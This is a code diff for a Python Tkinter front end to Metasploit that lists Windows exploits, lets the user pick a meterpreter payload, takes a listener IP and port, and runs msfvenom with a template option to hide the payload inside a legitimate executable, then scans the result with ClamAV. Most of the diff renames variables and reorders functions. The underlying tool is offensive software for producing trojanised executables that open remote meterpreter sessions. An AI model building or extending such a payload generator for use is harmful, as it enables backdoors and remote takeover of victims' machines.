@@ -37,12 +37,11 @@ def rm(thing):
 def myfunction(event):
 		    for c in (canvas, canvas1):
 			c.configure(scrollregion=c.bbox("all"),width=530,height=400)
-
 		    canvas0.configure(scrollregion=canvas0.bbox("all"),width=28,height=400)   
 		    canvas2.configure(scrollregion=canvas2.bbox("all"),width=540,height=193)
-		    canvas3.configure(scrollregion=canvas3.bbox("all"),width=540,height=400)
-		    canvas4.configure(scrollregion=canvas4.bbox("all"),width=540,height=400)
-
+                    canvas3.configure(scrollregion=canvas3.bbox("all"),width=540,height=400)
+                    canvas4.configure(scrollregion=canvas4.bbox("all"),width=540,height=400)
+		  
 # Show Windows Exploits
 def showExploits(): 
                 global exploit
@@ -50,30 +49,26 @@ def showExploits():
                     if "windows" in i:
 		        Radiobutton(frame, text=str(i), variable=var, value=i).pack(anchor=W)
                         
-                gbutton = Button(root, text="Show Compatible Payloads", bg='lightblue', state=ACTIVE, command=lambda: [showPayloads(),rm(gbutton)])
-	        gbutton.place(relx=0.5, rely=0.96,anchor=CENTER)
+                exploit_button = Button(root, text="Show Compatible Payloads", bg='lightblue', state=ACTIVE, command=lambda: [showPayloads(),rm(exploit_button)])
+	        exploit_button.place(relx=0.5, rely=0.96,anchor=CENTER)
                            
-
     
 # Show Compatible Payloads(only meterpreter)
 def showPayloads():
-    global fbutton
     raise_frame(f2)
     exploit = var.get()
     index_value = mod['modules'].index(exploit) 
     ret = client.call('module.compatible_payloads',[mod['modules'][index_value]])
-
     for i in (ret.get('payloads')):
         if "/meterpreter" in i:
            Radiobutton(frame1, text=str(i), variable=var, value=i).pack(anchor=W)
-    fbutton = Button(root, text="Choose Payload", bg='lightblue', state=ACTIVE, command=lambda: mal(var))
-    fbutton.place(x=420, y=525)
+    payload_button = Button(root, text="Choose Payload", bg='lightblue', state=ACTIVE, command=lambda: [insert_options(var), rm(payload_button)])
+    payload_button.place(x=420, y=525)
   
 # Set Payload Options
-def mal(var):
+def insert_options(var):
     
-    global payload, ip, top, porta , out, extra
-    rm(fbutton)
+    global payload, ip, top, port , output, extra
     payload = var.get()
     raise_frame(f3)
     top=Toplevel()
@@ -84,30 +79,40 @@ def mal(var):
     ip = Entry(top,width=22, bg="lightblue")
     ip.pack()
     Label(top, text='Local Port:').pack()
-    porta = Entry(top,width=22, bg="lightblue")
-    porta.pack()
-   
+    port = Entry(top,width=22, bg="lightblue")
+    port.pack()
     Label(top, text='Other options if required:').pack()
     extra = Entry(top,width=22, bg="lightblue")
     extra.pack()
-    
-   # v = StringVar(top, value='payloads/')
     Label(top, text="Payload's name: ").pack()
-    out = Entry(top, width=22, bg="lightblue")
-    out.pack()
-    information = Button(top, text="i", bg='lightblue', state=ACTIVE, command=lambda: [info()])
-    information.pack(side=RIGHT)
-    btn = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), cleanup(), gen_msg()])
-    btn.pack()
+    output = Entry(top, width=22, bg="lightblue")
+    output.pack()
+    information = Button(top, text="i", bg='lightblue', state=ACTIVE, command=lambda: [info()]).pack(side=RIGHT)
+    btn = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), cleanup(), generation_message()]).pack()
 
 def info():
     
     tkMessageBox.showinfo("Info for the extra options", "e.g: 'RHOST=192.168.X.X RPORT=445' or leave it blank ")
-def gen_msg():
+
+def generation_message():
 
     tkMessageBox.showinfo("DONE!", "Sorry for keep you waiting. The payload is now ready! ")
 
+def cleanup():
+       top.destroy()
 
+# Check IP's validity
+def validation():
+    global lhost, lport
+    lport = port.get()
+    lhost = ip.get()
+    while True:
+      # If LHOST and LPORT are valid, proceed to the payload's generation
+      if ipFormatChk(lhost) == True and portChk() == True:
+         generation()
+         break
+      else:
+         tkMessageBox.destroy()
 
 # Check IP's validity
 def ipFormatChk(lhost):
@@ -134,25 +139,10 @@ def ipFormatChk(lhost):
     else:
         tkMessageBox.showerror("Error", "Invalid IP Address")
         return False
-
-# Check IP's validity
-def validation():
-    global lhost
-    lhost = ip.get()
-    
-    while True:
-      #If LHOST is valid, proceed with the generation of the payload
-      if ipFormatChk(lhost) == True and portChk() == True:
-         generation()
-         break
-      else:
-         tkMessageBox.destroy()
-         
-
+ 
+# Check Local Port's validity
 def portChk():
-        global lport
-        lport = porta.get()
-	try:
+        try:
 	    
 	    if 1 <= int(lport) <= 65535:
 		
@@ -168,23 +158,20 @@ def generation():
     global scan, file_name, options, name, legit_file
     opt = extra.get()
     options = "'" + opt + "'"
-    onoma = out.get()
-    name =  "payloads/" + onoma
+    name =  "payloads/" + output.get()
     file_name =  name + ".exe"
     
 ############################################################################################################
 # User has to know in advance the required options in order for the payload to be executed successfully :) #
 ############################################################################################################
 
-    generate_payload = subprocess.Popen(['msfvenom', '-p', payload, lhost, lport, options, '-f', 'exe', '-x', legit_file, '-o', file_name], stdout=subprocess.PIPE).communicate()[0]
+    subprocess.Popen(['msfvenom', '-p', payload, lhost, lport, options, '-f', 'exe', '-x', legit_file, '-o', file_name], stdout=subprocess.PIPE).communicate()[0]
     yolo = Label(f3, text='Press the "Scan file for virus" button. It will begin the scanning with ClamAV.')
     yolo.place(x=2,y=5)
     scan = Button(root,text="Scan file for virus", bg='lightblue', state=ACTIVE, command=lambda: [clamscan(),rm(scan), raise_frame(f4)])
     scan.place(relx=0.5, rely=0.96,anchor=CENTER)   
    
-def cleanup():
-       top.destroy()
-    
+   
 def clamscan():
 
     tkMessageBox.showinfo("Loading...", "An attacker has to be patient...Wait for a few seconds after pressing the button in order for the scanning to be completed!")
